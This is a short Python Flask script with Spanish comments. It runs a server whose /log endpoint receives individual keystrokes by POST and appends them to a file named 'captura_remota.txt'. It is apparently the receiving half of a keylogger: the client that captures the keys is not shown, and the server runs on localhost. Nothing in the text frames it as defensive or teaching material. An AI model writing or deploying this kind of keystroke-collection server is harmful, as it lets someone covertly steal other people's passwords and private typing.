from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_key():
    key = request.form.get("key")
    if key:  # Si viene un dato válido
        print("Tecla recibida:", key)  # 👈 Debug en consola
        with open("captura_remota.txt", "a", encoding="utf-8") as f:
            f.write(key)
    return "OK"

if __name__ == "__main__":
    print("Servidor Flask corriendo en http://127.0.0.1:5000 ...")
    app.run(host="127.0.0.1", port=5000)
